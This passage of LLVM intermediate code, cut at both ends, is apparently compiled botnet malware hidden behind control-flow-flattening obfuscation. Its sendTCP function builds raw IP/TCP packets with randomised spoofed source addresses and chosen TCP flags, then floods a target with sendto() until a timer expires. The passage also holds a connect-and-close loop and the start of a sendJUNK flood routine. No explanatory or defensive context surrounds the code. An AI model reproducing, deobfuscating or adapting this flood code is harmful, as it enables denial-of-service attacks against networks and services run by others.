  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = icmp sgt i32 %23, %24
  %26 = select i1 %25, i32 -1334229029, i32 -494229064
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %28, i32* %8, align 4
  %29 = load i32, i32* %8, align 4
  %30 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %31 = call i32 @connect(i32 %29, %struct.sockaddr* %30, i32 16)
  %32 = call i32 @sleep(i32 1)
  %33 = load i32, i32* %8, align 4
  %34 = call i32 @close(i32 %33)
  store i32 1842248452, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %27, %22, %switchDefault
  br label %loopEntry
}

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  store i32 %28, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 663509278, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 663509278, label %first
    i32 -901044029, label %31
    i32 438768385, label %35
    i32 -702359205, label %40
    i32 1223145634, label %46
    i32 -1283560671, label %47
    i32 299995918, label %54
    i32 1837644673, label %55
    i32 -147812115, label %61
    i32 1699178078, label %62
    i32 -72714642, label %66
    i32 -203490634, label %67
    i32 -742053826, label %73
    i32 -464134942, label %121
    i32 780719753, label %157
    i32 1948448048, label %160
    i32 1390255121, label %164
    i32 -439118239, label %169
    i32 1969900547, label %177
    i32 1539578997, label %182
    i32 1405832570, label %190
    i32 922968127, label %195
    i32 563718596, label %203
    i32 1965880740, label %208
    i32 1238070525, label %216
    i32 -245003671, label %221
    i32 -1366177131, label %229
    i32 1553982228, label %230
    i32 1657010526, label %231
    i32 472038277, label %232
    i32 -1659703728, label %233
    i32 935993445, label %234
    i32 -559131478, label %236
    i32 -629131054, label %237
    i32 1944244832, label %255
    i32 -1009532843, label %257
    i32 1561061406, label %262
    i32 -2083036938, label %286
    i32 1596826902, label %287
    i32 407631005, label %334
    i32 1032368516, label %339
    i32 1202368251, label %340
    i32 -1735995818, label %341
    i32 1814215886, label %344
    i32 -1110003328, label %346
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %29 = icmp eq i32 %.reload, 0
  %30 = select i1 %29, i32 -901044029, i32 438768385
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  store i32 -702359205, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 -702359205, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 1223145634, i32 -1283560671
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -1110003328, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 8, i32 4, i1 false)
  %50 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %50, i32* %17, align 4
  %51 = load i32, i32* %17, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 1837644673, i32 299995918
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 -1110003328, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %56 = load i32, i32* %17, align 4
  %57 = bitcast i32* %18 to i8*
  %58 = call i32 @setsockopt(i32 %56, i32 0, i32 3, i8* %57, i32 4) #2
  %59 = icmp slt i32 %58, 0
  %60 = select i1 %59, i32 -147812115, i32 1699178078
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 -1110003328, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %14, align 4
  %64 = icmp eq i32 %63, 0
  %65 = select i1 %64, i32 -72714642, i32 -203490634
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 0, i32* %19, align 4
  store i32 -742053826, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %14, align 4
  %69 = sub nsw i32 32, %68
  %70 = shl i32 1, %69
  %71 = sub nsw i32 %70, 1
  %72 = xor i32 %71, -1
  store i32 %72, i32* %19, align 4
  store i32 -742053826, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %12, align 4
  %75 = sext i32 %74 to i64
  %76 = add i64 40, %75
  store i64 %76, i64* %.reg2mem2
  %77 = call i8* @llvm.stacksave()
  store i8* %77, i8** %20, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %78 = alloca i8, i64 %.reload4, align 16
  store i8* %78, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %79 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %79, %struct.iphdr** %21, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %81 = bitcast %struct.iphdr* %80 to i8*
  %82 = getelementptr i8, i8* %81, i64 20
  %83 = bitcast i8* %82 to %struct.tcphdr*
  store %struct.tcphdr* %83, %struct.tcphdr** %22, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %86 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* %19, align 4
  %89 = call i32 @getRandomIP(i32 %88)
  %90 = call i32 @htonl(i32 %89) #13
  %91 = load i32, i32* %12, align 4
  %92 = sext i32 %91 to i64
  %93 = add i64 20, %92
  %94 = trunc i64 %93 to i32
  call void @makeIPPacket(%struct.iphdr* %84, i32 %87, i32 %90, i8 zeroext 6, i32 %94)
  %95 = call i32 @rand_cmwc()
  %96 = trunc i32 %95 to i16
  %97 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %98 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %97, i32 0, i32 0
  %99 = bitcast %union.anon.0* %98 to %struct.anon.1*
  %100 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %99, i32 0, i32 0
  store i16 %96, i16* %100, align 4
  %101 = call i32 @rand_cmwc()
  %102 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon.0* %103 to %struct.anon.1*
  %105 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %104, i32 0, i32 2
  store i32 %101, i32* %105, align 4
  %106 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon.0* %107 to %struct.anon.1*
  %109 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %108, i32 0, i32 3
  store i32 0, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon.0* %111 to %struct.anon.1*
  %113 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %112, i32 0, i32 4
  %114 = load i16, i16* %113, align 4
  %115 = and i16 %114, -241
  %116 = or i16 %115, 80
  store i16 %116, i16* %113, align 4
  %117 = load i8*, i8** %11, align 8
  %118 = call i32 @strcmp(i8* %117, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.83, i32 0, i32 0)) #10
  %119 = icmp ne i32 %118, 0
  %120 = select i1 %119, i32 780719753, i32 -464134942
  store i32 %120, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %123 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon.0* %123 to %struct.anon.1*
  %125 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %124, i32 0, i32 4
  %126 = load i16, i16* %125, align 4
  %127 = and i16 %126, -513
  %128 = or i16 %127, 512
  store i16 %128, i16* %125, align 4
  %129 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %130 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %129, i32 0, i32 0
  %131 = bitcast %union.anon.0* %130 to %struct.anon.1*
  %132 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %131, i32 0, i32 4
  %133 = load i16, i16* %132, align 4
  %134 = and i16 %133, -1025
  %135 = or i16 %134, 1024
  store i16 %135, i16* %132, align 4
  %136 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %136, i32 0, i32 0
  %138 = bitcast %union.anon.0* %137 to %struct.anon.1*
  %139 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %138, i32 0, i32 4
  %140 = load i16, i16* %139, align 4
  %141 = and i16 %140, -257
  %142 = or i16 %141, 256
  store i16 %142, i16* %139, align 4
  %143 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %144 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %143, i32 0, i32 0
  %145 = bitcast %union.anon.0* %144 to %struct.anon.1*
  %146 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %145, i32 0, i32 4
  %147 = load i16, i16* %146, align 4
  %148 = and i16 %147, -4097
  %149 = or i16 %148, 4096
  store i16 %149, i16* %146, align 4
  %150 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %151 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %150, i32 0, i32 0
  %152 = bitcast %union.anon.0* %151 to %struct.anon.1*
  %153 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %152, i32 0, i32 4
  %154 = load i16, i16* %153, align 4
  %155 = and i16 %154, -2049
  %156 = or i16 %155, 2048
  store i16 %156, i16* %153, align 4
  store i32 -629131054, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i8*, i8** %11, align 8
  %159 = call i8* @strtok(i8* %158, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %159, i8** %23, align 8
  store i32 1948448048, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = load i8*, i8** %23, align 8
  %162 = icmp ne i8* %161, null
  %163 = select i1 %162, i32 1390255121, i32 -559131478
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8*, i8** %23, align 8
  %166 = call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i32 0, i32 0)) #10
  %167 = icmp ne i32 %166, 0
  %168 = select i1 %167, i32 1969900547, i32 -439118239
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %171 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %170, i32 0, i32 0
  %172 = bitcast %union.anon.0* %171 to %struct.anon.1*
  %173 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %172, i32 0, i32 4
  %174 = load i16, i16* %173, align 4
  %175 = and i16 %174, -513
  %176 = or i16 %175, 512
  store i16 %176, i16* %173, align 4
  store i32 935993445, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i8*, i8** %23, align 8
  %179 = call i32 @strcmp(i8* %178, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i32 0, i32 0)) #10
  %180 = icmp ne i32 %179, 0
  %181 = select i1 %180, i32 1405832570, i32 1539578997
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %184 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %183, i32 0, i32 0
  %185 = bitcast %union.anon.0* %184 to %struct.anon.1*
  %186 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %185, i32 0, i32 4
  %187 = load i16, i16* %186, align 4
  %188 = and i16 %187, -1025
  %189 = or i16 %188, 1024
  store i16 %189, i16* %186, align 4
  store i32 -1659703728, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i8*, i8** %23, align 8
  %192 = call i32 @strcmp(i8* %191, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i32 0, i32 0)) #10
  %193 = icmp ne i32 %192, 0
  %194 = select i1 %193, i32 563718596, i32 922968127
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 0
  %198 = bitcast %union.anon.0* %197 to %struct.anon.1*
  %199 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %198, i32 0, i32 4
  %200 = load i16, i16* %199, align 4
  %201 = and i16 %200, -257
  %202 = or i16 %201, 256
  store i16 %202, i16* %199, align 4
  store i32 472038277, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load i8*, i8** %23, align 8
  %205 = call i32 @strcmp(i8* %204, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.88, i32 0, i32 0)) #10
  %206 = icmp ne i32 %205, 0
  %207 = select i1 %206, i32 1238070525, i32 1965880740
  store i32 %207, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 0
  %211 = bitcast %union.anon.0* %210 to %struct.anon.1*
  %212 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %211, i32 0, i32 4
  %213 = load i16, i16* %212, align 4
  %214 = and i16 %213, -4097
  %215 = or i16 %214, 4096
  store i16 %215, i16* %212, align 4
  store i32 1657010526, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i8*, i8** %23, align 8
  %218 = call i32 @strcmp(i8* %217, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i32 0, i32 0)) #10
  %219 = icmp ne i32 %218, 0
  %220 = select i1 %219, i32 -1366177131, i32 -245003671
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 0
  %224 = bitcast %union.anon.0* %223 to %struct.anon.1*
  %225 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %224, i32 0, i32 4
  %226 = load i16, i16* %225, align 4
  %227 = and i16 %226, -2049
  %228 = or i16 %227, 2048
  store i16 %228, i16* %225, align 4
  store i32 1553982228, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  store i32 1553982228, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  store i32 1657010526, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  store i32 472038277, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  store i32 -1659703728, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  store i32 935993445, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %235, i8** %23, align 8
  store i32 1948448048, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  store i32 -629131054, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = call i32 @rand_cmwc()
  %239 = trunc i32 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon.0* %241 to %struct.anon.1*
  %243 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %242, i32 0, i32 5
  store i16 %239, i16* %243, align 2
  %244 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 0
  %246 = bitcast %union.anon.0* %245 to %struct.anon.1*
  %247 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %246, i32 0, i32 6
  store i16 0, i16* %247, align 4
  %248 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 0
  %250 = bitcast %union.anon.0* %249 to %struct.anon.1*
  %251 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %250, i32 0, i32 7
  store i16 0, i16* %251, align 2
  %252 = load i32, i32* %9, align 4
  %253 = icmp eq i32 %252, 0
  %254 = select i1 %253, i32 1944244832, i32 -1009532843
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = call i32 @rand_cmwc()
  store i32 1561061406, i32* %switchVar
  store i32 %256, i32* %.reg2mem10
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i32, i32* %9, align 4
  %259 = trunc i32 %258 to i16
  %260 = call zeroext i16 @htons(i16 zeroext %259) #13
  %261 = zext i16 %260 to i32
  store i32 1561061406, i32* %switchVar
  store i32 %261, i32* %.reg2mem10
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %263 = trunc i32 %.reload11 to i16
  %264 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 0
  %266 = bitcast %union.anon.0* %265 to %struct.anon.1*
  %267 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %266, i32 0, i32 1
  store i16 %263, i16* %267, align 2
  %268 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %269 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %270 = call zeroext i16 @tcpcsum(%struct.iphdr* %268, %struct.tcphdr* %269)
  %271 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon.0* %272 to %struct.anon.1*
  %274 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %273, i32 0, i32 6
  store i16 %270, i16* %274, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %275 = bitcast i8* %.reload8 to i16*
  %276 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 2
  %278 = load i16, i16* %277, align 2
  %279 = zext i16 %278 to i32
  %280 = call zeroext i16 @csum(i16* %275, i32 %279)
  %281 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 7
  store i16 %280, i16* %282, align 2
  %283 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %284 = load i32, i32* %10, align 4
  %285 = add nsw i32 %283, %284
  store i32 %285, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 -2083036938, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 1596826902, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i32, i32* %17, align 4
  %289 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %290 = call i64 @sendto(i32 %288, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %289, i32 16)
  %291 = load i32, i32* %19, align 4
  %292 = call i32 @getRandomIP(i32 %291)
  %293 = call i32 @htonl(i32 %292) #13
  %294 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i32 0, i32 8
  store i32 %293, i32* %295, align 4
  %296 = call i32 @rand_cmwc()
  %297 = trunc i32 %296 to i16
  %298 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %299 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %298, i32 0, i32 3
  store i16 %297, i16* %299, align 4
  %300 = call i32 @rand_cmwc()
  %301 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 0
  %303 = bitcast %union.anon.0* %302 to %struct.anon.1*
  %304 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %303, i32 0, i32 2
  store i32 %300, i32* %304, align 4
  %305 = call i32 @rand_cmwc()
  %306 = trunc i32 %305 to i16
  %307 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %308 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %307, i32 0, i32 0
  %309 = bitcast %union.anon.0* %308 to %struct.anon.1*
  %310 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %309, i32 0, i32 0
  store i16 %306, i16* %310, align 4
  %311 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %312 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %311, i32 0, i32 0
  %313 = bitcast %union.anon.0* %312 to %struct.anon.1*
  %314 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %313, i32 0, i32 6
  store i16 0, i16* %314, align 4
  %315 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %316 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %317 = call zeroext i16 @tcpcsum(%struct.iphdr* %315, %struct.tcphdr* %316)
  %318 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon.0* %319 to %struct.anon.1*
  %321 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %320, i32 0, i32 6
  store i16 %317, i16* %321, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %322 = bitcast i8* %.reload6 to i16*
  %323 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 2
  %325 = load i16, i16* %324, align 2
  %326 = zext i16 %325 to i32
  %327 = call zeroext i16 @csum(i16* %322, i32 %326)
  %328 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 7
  store i16 %327, i16* %329, align 2
  %330 = load i32, i32* %25, align 4
  %331 = load i32, i32* %15, align 4
  %332 = icmp eq i32 %330, %331
  %333 = select i1 %332, i32 407631005, i32 -1735995818
  store i32 %333, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  %335 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %336 = load i32, i32* %24, align 4
  %337 = icmp sgt i32 %335, %336
  %338 = select i1 %337, i32 1032368516, i32 1202368251
  store i32 %338, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  store i32 1814215886, i32* %switchVar
  br label %loopEnd

; <label>:340:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 -2083036938, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i32, i32* %25, align 4
  %343 = add i32 %342, 1
  store i32 %343, i32* %25, align 4
  store i32 -2083036938, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %345)
  store i32 -1110003328, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %344, %341, %340, %339, %334, %287, %286, %262, %257, %255, %237, %236, %234, %233, %232, %231, %230, %229, %221, %216, %208, %203, %195, %190, %182, %177, %169, %164, %160, %157, %121, %73, %67, %66, %62, %61, %55, %54, %47, %46, %40, %35, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %.reg2mem27 = alloca i32
  %.reg2mem6 = alloca %struct.state_t*
  %.reg2mem = alloca i32
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %20 = call i32 @getdtablesize() #2
  %21 = sdiv i32 %20, 2
  store i32 %21, i32* %7, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %22, align 4
  %23 = load i32, i32* %5, align 4
  %24 = trunc i32 %23 to i16
  %25 = call zeroext i16 @htons(i16 zeroext %24) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = load i8*, i8** %4, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %29 = call i32 @getHost(i8* %27, %struct.in_addr* %28)
  store i32 %29, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -586411090, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar5 = load i32, i32* %switchVar
  switch i32 %switchVar5, label %switchDefault [
    i32 -586411090, label %first
    i32 2100088934, label %32
    i32 -225262844, label %33
    i32 914960120, label %49
    i32 1380362092, label %54
    i32 -148596308, label %55
    i32 1751035593, label %60
    i32 1029596869, label %NodeBlock3
    i32 591395189, label %NodeBlock
    i32 -1688871905, label %LeafBlock1
    i32 1767683324, label %LeafBlock
    i32 1684353079, label %71
